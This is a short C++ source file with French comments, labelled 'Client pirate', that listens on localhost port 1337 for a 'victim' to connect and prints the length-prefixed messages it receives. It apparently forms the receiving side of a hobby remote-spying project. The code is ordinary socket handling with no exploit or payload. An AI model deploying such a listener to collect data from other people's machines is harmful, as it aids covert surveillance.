//Client pirate


#include "iostream"
#include "../MyPNet/IncludeMe.h"

int main(){ // Main client -- cible
    if(MyPNet::Network::Initialize()){

        MyPNet::Socket socket;
        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
            if (socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout << "Écoute du Socket complété"<<std::endl;
                //new connection
                MyPNet::Socket connectionACible;
                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;
                if (socket.AcceptConnection(connectionACible) == MyPNet::PResult::P_Success){
                    std::cout<<"Victime connecté" << std::endl;

                    std::string buffer = "";

                    while(true){
                        uint32_t bufferSize = 0;
                        bufferSize = htonl(bufferSize);
                        int result = connectionACible.ReceiveALL(&bufferSize, sizeof(uint32_t));
                        if(result != MyPNet::PResult::P_Success){
                            break;
                        }
                        bufferSize = ntohl(bufferSize);

                        buffer.resize(bufferSize);
                        result = connectionACible.ReceiveALL(&buffer[0], bufferSize);
                        if(result != MyPNet::PResult::P_Success){
                            break;
                        }
                        std::cout << "[" << bufferSize << "] - " << buffer << std::endl;
                    }
                }
            }
            socket.CloseSocket();
        }
    }

    MyPNet::Network::Shutdown(); //ferme l'interface
    return 0;
}